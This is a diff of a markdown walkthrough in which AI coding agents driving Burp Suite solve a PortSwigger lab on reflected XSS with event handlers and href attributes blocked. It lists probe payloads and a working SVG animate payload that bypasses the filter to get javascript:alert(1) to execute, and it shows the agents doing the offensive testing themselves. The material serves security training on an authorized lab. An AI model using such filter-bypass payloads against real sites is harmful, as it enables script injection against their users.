@@ -1,67 +1,83 @@
 # Example: Reflected XSS with Event Handlers and href Attributes Blocked
 
-## PortSwigger Lab Solved with Claude Code + Burp Suite
+## PortSwigger Lab Solved with Claude Code or Codex + Burp Suite
 
-This is a real-world example of how this setup was used to solve an Expert-level XSS lab on PortSwigger Web Security Academy.
+This is an example workflow for either supported client:
 
----
+- Claude uses `burpsuite` plus `chrome-devtools`
+- Codex uses `burp` plus `burp-browser`
 
 ## Context
 
-**Lab:** Reflected XSS with event handlers and `href` attributes blocked
-**Objective:** Execute `alert(1)` by exploiting a reflected XSS with a WAF that blocks event handlers and the href attribute.
+- Lab: Reflected XSS with event handlers and `href` attributes blocked
+- Objective: Execute `alert(1)` on an authorized PortSwigger lab target
 
 ## Workflow
 
-### 1. Initial Reconnaissance
+### 1. Initial reconnaissance
 
-Claude Code was asked to navigate to the lab and take a snapshot:
+Claude prompt:
 
+```text
+Inspect this authorized PortSwigger lab and identify where user input is reflected.
 ```
-Navigate to https://[LAB-ID].web-security-academy.net/ and analyze the page
+
+Codex prompt:
+
+```text
+Use $openburp-codex to inspect this authorized PortSwigger lab and identify where user input is reflected.
 ```
 
-Claude automatically identified:
-- A blog with search functionality
-- A `search` GET parameter that reflects user input inside an `<h1>` tag
+Expected behavior:
 
-### 2. WAF Enumeration with Burp
+- open the lab through the browser MCP that is routed via Burp
+- identify the reflected parameter
+- keep raw request testing inside Burp
 
-Claude sent test requests via Burp Suite to map the WAF rules:
+### 2. WAF enumeration with Burp
 
-| Payload | WAF Response |
-|---------|--------------|
-| `<img src=x onerror=alert(1)>` | `"Tag is not allowed"` |
-| `<body onload=alert(1)>` | `"Tag is not allowed"` |
-| `<svg onload=alert(1)>` | `"Event is not allowed"` |
-| `<a href="javascript:alert(1)">` | `"Attribute is not allowed"` |
-| `<svg>` | **200 OK - Tag allowed** |
+Use Burp MCP to send a few controlled payloads and map the filter behavior:
 
-### 3. Exploit Development
+| Payload | Expected signal |
+|---------|-----------------|
+| `<img src=x onerror=alert(1)>` | Tag blocked |
+| `<body onload=alert(1)>` | Tag blocked |
+| `<svg onload=alert(1)>` | Event blocked |
+| `<a href="javascript:alert(1)">` | Attribute blocked |
+| `<svg>` | Allowed |
 
-Using the WAF intel, Claude crafted a payload using SVG `<animate>` to dynamically inject `href`:
+### 3. Exploit development
+
+Once the filter behavior is clear, craft an SVG payload that sets `href` dynamically:
 
 ```html
 <svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click</text></a></svg>
 ```
 
-**Why it works:**
-- `<svg>`, `<a>`, `<animate>`, and `<text>` are all allowed tags
-- The WAF blocks `href` as a direct attribute, but `<animate attributeName=href>` sets it dynamically at render time via SMIL animation
-- The WAF doesn't detect this as an `href` attribute since it's a value inside `attributeName`
+Why it works:
+
+- `<svg>`, `<a>`, `<animate>`, and `<text>` are allowed
+- The WAF blocks direct `href`, but not dynamic assignment through `attributeName=href`
+- The payload stays within the observed allowlist
 
 ### 4. Verification
 
-Claude navigated to the URL with the payload using Chrome DevTools and confirmed the lab was marked as **Solved**.
+Use the Burp-routed browser to confirm the payload behavior and capture evidence, while Burp records the traffic for replay or reporting.
 
-## Prompt Used
+## Example prompts
 
+Claude:
+
+```text
+Solve this authorized PortSwigger XSS lab. Use Burp for payload testing and Chrome DevTools for verification. Keep the scope minimal and explain each request.
 ```
-Solve this PortSwigger lab: Reflected XSS with event handlers and href
-attributes blocked. URL: https://[LAB-ID].web-security-academy.net/
-Use Burp to test payloads and Chrome to verify.
+
+Codex:
+
+```text
+Use $openburp-codex to solve this authorized PortSwigger XSS lab. Use Burp for payload testing and the Burp-proxied browser for verification. Keep the scope minimal and explain each request.
 ```
 
-## Total Time: ~2 minutes
+## Safety
 
-The entire process (reconnaissance, WAF enumeration, payload development, and verification) was completed by Claude Code autonomously in approximately 2 minutes.
+Use this pattern only on labs, staging environments, or targets you are explicitly authorized to test.
